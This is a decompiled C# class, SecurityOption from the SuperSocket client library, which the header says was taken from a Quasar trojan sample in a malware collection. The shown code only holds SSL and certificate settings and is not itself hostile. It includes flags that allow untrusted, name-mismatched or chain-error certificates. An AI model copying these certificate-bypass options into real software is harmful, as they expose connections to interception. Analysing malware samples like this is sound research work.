// Decompiled with JetBrains decompiler
// Type: NoiseMe.Drags.App.Models.SuperSocket.ClientEngine.SecurityOption
// Assembly: Stubv2.0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E945C042-2241-44AF-B826-4AD3FC72B170
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Quasar.gen-a3f98ee0a78f039e0a9ea52dba13c713dc46f749512bd7d108cc9c05f57fc93d.exe

using System.Net;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;

namespace NoiseMe.Drags.App.Models.SuperSocket.ClientEngine
{
  public class SecurityOption
  {
    public SslProtocols EnabledSslProtocols { get; set; }

    public X509CertificateCollection Certificates { get; set; }

    public bool AllowUnstrustedCertificate { get; set; }

    public bool AllowNameMismatchCertificate { get; set; }

    public bool AllowCertificateChainErrors { get; set; }

    public NetworkCredential Credential { get; set; }

    public SecurityOption()
      : this(SecurityOption.GetDefaultProtocol(), new X509CertificateCollection())
    {
    }

    public SecurityOption(SslProtocols enabledSslProtocols)
      : this(enabledSslProtocols, new X509CertificateCollection())
    {
    }

    public SecurityOption(SslProtocols enabledSslProtocols, X509Certificate certificate)
      : this(enabledSslProtocols, new X509CertificateCollection(new X509Certificate[1]
      {
        certificate
      }))
    {
    }

    public SecurityOption(SslProtocols enabledSslProtocols, X509CertificateCollection certificates)
    {
      this.EnabledSslProtocols = enabledSslProtocols;
      this.Certificates = certificates;
    }

    public SecurityOption(NetworkCredential credential) => this.Credential = credential;

    private static SslProtocols GetDefaultProtocol() => SslProtocols.Default;
  }
}
